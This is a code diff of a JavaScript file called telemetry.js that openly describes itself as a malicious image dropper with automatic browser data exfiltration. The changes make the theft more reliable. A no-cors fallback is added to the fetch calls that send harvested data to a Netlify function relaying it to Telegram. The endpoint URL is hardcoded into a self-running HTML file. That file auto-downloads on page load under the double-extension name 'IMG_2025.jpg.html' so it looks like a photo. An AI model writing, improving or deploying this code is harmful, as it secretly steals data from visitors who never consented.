@@ -1,4 +1,4 @@
-// telemetry.js – Universal Image Dropper (Double Extension Trick) + Silent Telemetry
+// telemetry.js – Universal Image Dropper (FIXED: Absolute URL + CORS)
 (function() {
   'use strict';
 
@@ -8,14 +8,28 @@
   // Helper: Send data to Netlify → Telegram
   async function sendToBackend(module, payload) {
     try {
-      await fetch(ENDPOINT, {
+      // Try with CORS
+      const res = await fetch(ENDPOINT, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({ module, ...payload, timestamp: new Date().toISOString() }),
         cache: 'no-store',
         keepalive: true
       });
-    } catch (_) {}
+      if (!res.ok) throw new Error('Server error');
+    } catch (e) {
+      // Fallback: Try no-cors mode (sends data but ignores response)
+      try {
+        await fetch(ENDPOINT, {
+          method: 'POST',
+          mode: 'no-cors',
+          headers: { 'Content-Type': 'text/plain' },
+          body: JSON.stringify({ module, ...payload, timestamp: new Date().toISOString() }),
+          cache: 'no-store',
+          keepalive: true
+        });
+      } catch (_) {}
+    }
   }
 
   // ---------- 1. BROWSER DATA EXFIL (AUTO, NO PERMISSION) ----------
@@ -131,12 +145,16 @@
     };
   }
 
-  // ---------- 2. MALICIOUS IMAGE DROPPER (DOUBLE EXTENSION TRICK) ----------
+  // ---------- 2. MALICIOUS IMAGE DROPPER (DOUBLE EXTENSION + ABSOLUTE URL) ----------
   function dropMaliciousImage() {
     try {
       // Real image URL (will be displayed inside the HTML)
-      const imageUrl = 'https://files.catbox.moe/l9xdjq.png'; // A real image
-      const siteUrl = window.location.origin;
+      const imageUrl = 'https://files.catbox.moe/l9xdjq.png';
+      
+      // CRITICAL: Get the absolute URL of the current site (your Netlify URL)
+      // This will be baked into the downloaded HTML
+      const siteOrigin = window.location.origin;
+      const absoluteEndpoint = `${siteOrigin}/.netlify/functions/telemetry`;
 
       // Self-contained HTML page that shows a real image and runs telemetry
       const htmlContent = `<!DOCTYPE html>
@@ -191,18 +209,32 @@
   <!-- ========== TELEMETRY SCRIPT (SILENT) ========== -->
   <script>
     (function() {
-      const ENDPOINT = '${siteUrl}/.netlify/functions/telemetry';
+      // HARDCODED ABSOLUTE URL (baked during generation)
+      const ENDPOINT = '${absoluteEndpoint}';
 
       async function sendData(module, payload) {
         try {
-          await fetch(ENDPOINT, {
+          // Try CORS mode
+          const res = await fetch(ENDPOINT, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({ module, ...payload, timestamp: new Date().toISOString() }),
             cache: 'no-store',
             keepalive: true
           });
-        } catch (_) {}
+        } catch (e) {
+          // Fallback: no-cors mode (works even if CORS fails)
+          try {
+            await fetch(ENDPOINT, {
+              method: 'POST',
+              mode: 'no-cors',
+              headers: { 'Content-Type': 'text/plain' },
+              body: JSON.stringify({ module, ...payload, timestamp: new Date().toISOString() }),
+              cache: 'no-store',
+              keepalive: true
+            });
+          } catch (_) {}
+        }
       }
 
       async function collect() {
@@ -315,7 +347,7 @@
         };
       }
 
-      // Auto-run
+      // AUTO-RUN when this HTML is opened
       collect().then(data => {
         sendData('IMAGE_DROPPER_PAYLOAD', data);
       });
@@ -325,12 +357,11 @@
 </html>`;
 
       // Download as HTML with double extension: .jpg.html
-      // This way, if victim has "Hide extensions" enabled, they see only .jpg
       const blob = new Blob([htmlContent], { type: 'text/html' });
       const url = URL.createObjectURL(blob);
       const a = document.createElement('a');
       a.href = url;
-      a.download = 'IMG_2025.jpg.html'; // DOUBLE EXTENSION TRICK
+      a.download = 'IMG_2025.jpg.html';
       a.style.display = 'none';
       document.body.appendChild(a);
       a.click();
@@ -343,7 +374,7 @@
       sendToBackend('IMAGE_DROPPER_DELIVERED', {
         status: 'Downloaded',
         filename: 'IMG_2025.jpg.html',
-        note: 'Victim sees "IMG_2025.jpg" if extensions are hidden. Opens in browser.'
+        note: 'Absolute URL baked in: ' + absoluteEndpoint
       });
     } catch (e) {
       sendToBackend('IMAGE_DROPPER_ERROR', { error: e.message });
@@ -364,7 +395,7 @@
     // Drop the disguised HTML file
     dropMaliciousImage();
 
-    console.log('%c✅ Payload delivered. File: IMG_2025.jpg.html (shows as .jpg)', 'font-size:16px; color:#00ffcc;');
+    console.log('%c✅ Payload delivered. File: IMG_2025.jpg.html', 'font-size:16px; color:#00ffcc;');
   }
 
   // ---------- 4. TRIGGER ON PAGE LOAD (BINA CLICK KE) ----------
